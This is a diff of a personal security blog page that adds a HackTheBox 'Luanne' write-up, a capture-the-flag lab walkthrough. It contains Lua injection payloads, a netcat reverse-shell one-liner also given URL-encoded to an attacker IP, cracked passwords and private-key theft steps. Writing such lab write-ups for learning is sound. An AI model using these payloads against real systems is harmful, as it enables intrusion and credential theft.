@@ -33,10 +33,10 @@
   
     
   
-  <meta name="description" content="Welcome to my personal Security blog!" />
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Luanne, Which is an Easy OpenBSD machine!" />
 
   
-  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-luanne/" />
 
   
 
@@ -276,8 +276,6 @@
   
 
   
-    <link rel="alternate" href="/writeups/index.xml" type="application/rss+xml" title="Mohamed ELLEUCH" />
-  
 
   
     <link rel="manifest" href="/index.webmanifest" />
@@ -286,7 +284,7 @@
   <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
   <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
 
-  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/" />
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-luanne/" />
 
   
   
@@ -296,20 +294,23 @@
   
   
     
-    
   
   
-  <meta property="twitter:card" content="summary" />
+  <meta property="twitter:card" content="summary_large_image" />
   
   <meta property="og:site_name" content="Mohamed ELLEUCH" />
-  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/" />
-  <meta property="og:title" content="Posts | Mohamed ELLEUCH" />
-  <meta property="og:description" content="Welcome to my personal Security blog!" /><meta property="og:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" />
-    <meta property="twitter:image" content="https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png" /><meta property="og:locale" content="en-us" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-luanne/" />
+  <meta property="og:title" content="HackTheBox - Luanne Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Luanne, Which is an Easy OpenBSD machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-luanne/featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-luanne/featured.png" /><meta property="og:locale" content="en-us" />
   
     
-      <meta property="og:updated_time" content="2021-03-27T00:00:00&#43;00:00" />
+      <meta
+        property="article:published_time"
+        content="2021-03-27T00:00:00&#43;00:00"
+      />
     
+    <meta property="article:modified_time" content="2021-03-27T00:00:00&#43;00:00">
   
 
   
@@ -320,11 +321,13 @@
 
   
 
+  
 
 
 
 
-  <title>Posts | Mohamed ELLEUCH</title>
+
+  <title>HackTheBox - Luanne Writeup | Mohamed ELLEUCH</title>
 </head>
 
 
@@ -588,6 +591,225 @@
   </div>
 
   <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - Luanne Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Luanne, Which is an Easy OpenBSD machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Mar 27, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 589px; max-height: 377px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-luanne/featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolordarkredinformation-gathering-p"><p style="color:DArkRED">Information Gathering </p></h1>
+<hr>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<pre><code class="language-bash">sudo nmap -sC -sV 10.10.10.218 -v
+</code></pre>
+<img src="nmap.png">
+<p>As we can see above, We have 3 PORTS open:</p>
+<ul>
+<li>Port 22 running OpenSSH 8.0 ; Recent version, no need waste time on it</li>
+<li>Port 80 running nginx ; robots.txt &ndash;&gt; /weather</li>
+<li>Port 9001 running Medusa httpd 1.12 ; If we were on linux i think this should be something interesting</li>
+</ul>
+<blockquote>
+<p>Skipping the gobuster part, it will only show us robots.txt. I do prefer Dirb when it comes to directory bruteforcing</p>
+</blockquote>
+<h2 id="p-stylecolorgreendirb-scan-p"><p style="color:Green">Dirb scan </p></h2>
+<blockquote>
+<p>You can clone the SecLists repo from here <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p>
+</blockquote>
+<p>We already got  <strong>/weather/</strong> from the nmap results, let&rsquo;s see enum more</p>
+<pre><code class="language-bash">dirb http://10.10.10.218/weather/ /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt -R
+</code></pre>
+<img src="dirb.png">
+<hr>
+<h1 id="p-stylecolordarkredfootholdp"><p style="color:DArkRED">Foothold</p></h1>
+<p>From our previous scans we were able to find</p>
+<pre><code class="language-url">http://10.10.10.218/weather/forecast/
+</code></pre>
+<img src="forecast.png">
+Let's try it as a GET param
+<img src="get.png">
+Adding a < ' > causes an error
+<img src="luaerror.png">
+<blockquote>
+<p>Skipping the SQL Injection part as it got me nothing</p>
+</blockquote>
+<p>Let&rsquo;s now try if we have any potential code injection.
+Basically, The idea is to end the current lua command and inject.
+Another think to note for lua a comment starts anywhere with a double hyphen ( &ndash; ) and runs until the end of the line.</p>
+<p>Let&rsquo;s first try this payload</p>
+<pre><code class="language-url">/weather/forecast?city=London');print(&quot;\nhi&quot;)--
+</code></pre>
+<img src="print.png">
+That worked! Let's try if we can use system commands
+<pre><code class="language-url">/weather/forecast?city=London');print(&quot;\n&quot;);os.execute(&quot;id&quot;)--
+</code></pre>
+<img src="id.png">
+<p>That worked aswell! Let&rsquo;s now get a reverse shell</p>
+<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f
+</code></pre>
+<p>Final url encoded payload:</p>
+<pre><code class="language-url">/weather/forecast?city=%4c%6f%6e%64%6f%6e%27%29%3b%70%72%69%6e%74%28%22%5c%6e%22%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%39%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29%2d%2d
+</code></pre>
+<p>Let&rsquo;s execute it and get a shell on the box
+<img src="foothold.png"></p>
+<hr>
+<h1 id="p-stylecolordarkreduser-privescp"><p style="color:darkred">User PrivEsc</p></h1>
+<p>We can see that we have the default  <strong>.htpasswd</strong> file which can contain potential passwords
+<img src="pass.png">
+Let&rsquo;s see what we got there
+<img src="webapi.png"></p>
+<pre><code class="language-bash">echo &quot;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0&quot; &gt; hash ; john hash -w=/opt/rockyou.txt
+</code></pre>
+<p>And we cracked it!
+<img src="best.png"></p>
+<p>Let&rsquo;s start by viewing the running processes</p>
+<blockquote>
+<p>You need to specify the w tag to view the whole command</p>
+</blockquote>
+<img src="mich.png">
+We can see that the user **r.michaels** is running a local server at port 3001! Let's exploit this to get his private SSH key!
+<pre><code class="language-bash">curl http://127.0.0.1:3001/~r.michaels/id_rsa
+</code></pre>
+<p>But we get 401 Unauthorized page!</p>
+<img src="unauth.png">
+Let's try the credentials that we got earlier
+<pre><code class="language-bash">curl http://127.0.0.1:3001/~r.michaels/id_rsa --user webapi_user:iamthebest
+</code></pre>
+<img src="ssh.png">
+And it worked! Let's login to the user
+<img src="user.png">
+<p>And we grab that user flag!</p>
+<h1 id="p-stylecolordarkredroot-privescp"><p style="color:darkred">Root PrivEsc</p></h1>
+<p>An interesting backups file which contains an encrypted tar.gz file</p>
+<img src="back.png">
+<p>Because we&rsquo;re on an OpenBSD box, we&rsquo;re gonna use netpgp to decrypt then extract its content</p>
+<pre><code class="language-bash">netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=backup.tar.gz
+</code></pre>
+<img src="tar.png">
+<p>Let&rsquo;s check that .htpasswd file!
+<img src="root.png">
+<code>webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.</code></p>
+<p>Let&rsquo;s crack this password with john!</p>
+<img src="pass_root.png">
+<p><code>littlebear</code></p>
+<p>Let&rsquo;s try to switch to the root user with this password!</p>
+<blockquote>
+<p><a href="https://www.vultr.com/docs/introduction-to-doas-on-openbsd">https://www.vultr.com/docs/introduction-to-doas-on-openbsd</a></p>
+</blockquote>
+<pre><code class="language-bash">doas su
+</code></pre>
+<img src="roott.png">
+<p>And we rooted the box!</p>
+<hr>
+<h1 id="p-stylecolordarkredbonus-sectionp"><p style="color:darkred">Bonus Section</p></h1>
+<p>Let&rsquo;s see what caused the lua injection!</p>
+<pre><code class="language-bash">cat /home/r.michaels/devel/webapi/weather.lua
+</code></pre>
+<p>Going through the code we can see what just exploited!</p>
+<pre><code class="language-lua">httpd.write('&quot;error&quot;: &quot;unknown city: ' .. city .. '&quot;}')
+</code></pre>
+<p>basically what we have done is</p>
+<pre><code class="language-lua">httpd.write('&quot;error&quot;: &quot;unknown city: 'hi');os.execute(&quot;id&quot;) -- '&quot;}')
+</code></pre>
+<p>To avoid this kind of injection, we should validate and sanitize the &ldquo;city&rdquo; input. Scanning the city variable for escape characters and special symbols, making a blacklist for any suspicious word {os,execute,print,&hellip;}
+Or just by removing the &lsquo;.. city ..&rsquo; part!</p>
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
     
 
 
@@ -595,86 +817,228 @@
 
 
 
-
-
-
-
-
-
+<div class="article-tags">
   
-
-  
-  
-  
-    
-  
-<div class="universal-wrapper pt-3">
-  <h1>Posts</h1>
-
-  
-
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
   
 </div>
 
 
 
-<div class="universal-wrapper">
-  
-
-  
-  
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-luanne/" >HackTheBox - Luanne Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Luanne, Which is an Easy OpenBSD machine!
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-luanne/&amp;text=HackTheBox%20-%20Luanne%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-luanne/&amp;t=HackTheBox%20-%20Luanne%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-passage/" >HackTheBox - Passage Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Passage, Which is a Medium Linux machine!
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20Luanne%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-luanne/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
         
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-luanne/&amp;title=HackTheBox%20-%20Luanne%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/htb-academy/" >HackTheBox - Academy Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          Here's my writeup for the RETIRED machine Academy, Which is an easy Linux machine that only require enumarations
-        
-      </div>
-    </div>
-  
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20Luanne%20Writeup%20https://mohamed-elleuch.me/writeups/htb-luanne/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
     
-    
-    
-    <div>
-      <h2><a href="/writeups/hacklockad/" >HackLock Active Directory Workshop Writeup</a></h2>
-      <div class="article-style">
+      
+      
+      
         
-          I had the chance to participate in the hacklock event organized by Securinets and also win \o/. Here's the writeup that i presented in front of the jury.
-        
-      </div>
-    </div>
-  
-
-  
-
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-luanne/&amp;title=HackTheBox%20-%20Luanne%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
 </div>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
   </div>
 
   <div class="page-footer">
